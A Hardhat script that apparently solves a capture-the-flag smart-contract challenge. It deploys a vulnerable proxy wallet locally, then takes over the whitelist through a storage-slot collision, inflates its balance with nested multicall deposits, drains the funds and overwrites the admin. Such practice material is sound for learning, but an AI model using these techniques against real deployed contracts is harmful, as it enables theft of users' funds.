const hre = require("hardhat");


async function niceDeploy(name, ...args) {
  const Blueprint = await hre.ethers.getContractFactory(name);
  let ctr
  if (args) {
    ctr = await Blueprint.deploy(...args);
  } else {
    ctr = await Blueprint.deploy();
  }
  
  await ctr.deployed();
  console.log("%s deployed to: %s", name, ctr.address);
  return [Blueprint, ctr]
}

async function getSlots(ctr, pos) {
    console.log("----------- Slot Layout ----------------")
    for(let i = 0; i < pos.length; i++) {
        console.log("\tSlot[%d] = ", i, await hre.ethers.provider.getStorageAt(ctr.address, pos[i]))
    }
    console.log("----------------End Layout-----------------------")
}

async function printStatus(proxy, deco) {
  const accounts = await hre.ethers.getSigners();
  console.log("--------------------Status-------------------")
  console.log("Admin: ", await proxy.admin())
  console.log("Owner: ", await deco.owner())
  console.log("Addr0 on WL: ", await deco.whitelisted(accounts[0].address))
  console.log("Addr1 on WL: ", await deco.whitelisted(accounts[1].address))
  console.log("Addr0 bal: ", await deco.balances(accounts[0].address))
  console.log("Addr1 bal ", await deco.balances(accounts[1].address))
  console.log("total bal: ", await hre.ethers.provider.getBalance(proxy.address))
  console.log("---------------------END ------------------")
}

async function main() {
  let tx
  const accounts = await hre.ethers.getSigners();

  const iface = new hre.ethers.utils.Interface(["function init(uint256)", "function deposit()", "function multicall(bytes[])"])
  const init_enc = iface.encodeFunctionData("init", [ 0x12345678 ])

  const [PuzzleWallet, pw] = await niceDeploy("PuzzleWallet");
  const [PuzzleProxy, proxy] = await niceDeploy("PuzzleProxy", accounts[0].address, pw.address, init_enc);
  let deco = PuzzleWallet.attach(proxy.address)
  
  tx = await deco.addToWhitelist(accounts[0].address)
  await tx.wait()
  tx = await deco.deposit({value: 1000})
  await tx.wait()

  await getSlots(proxy, [0,1,2,3])
  await printStatus(proxy, deco)

  //solution
  tx = await proxy.connect(accounts[1]).proposeNewAdmin(accounts[1].address)
  await tx.wait()

  await printStatus(proxy, deco)

  tx = await deco.connect(accounts[1]).addToWhitelist(accounts[1].address)
  await tx.wait()

  await printStatus(proxy, deco)


  const dep_enc = iface.encodeFunctionData("deposit",[])
  const mul_enc = iface.encodeFunctionData("multicall", [[dep_enc,] ])

  tx = await deco.connect(accounts[1]).multicall(Array(30).fill(mul_enc), {value: 40})
  await tx.wait()

  await printStatus(proxy, deco)


  tx = await deco.connect(accounts[1]).execute(accounts[1].address, 0x0410, [])
  await tx.wait()

  await printStatus(proxy, deco)

  tx = await deco.connect(accounts[1]).setMaxBalance(accounts[1].address)
  await tx.wait()

  await printStatus(proxy, deco)

}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
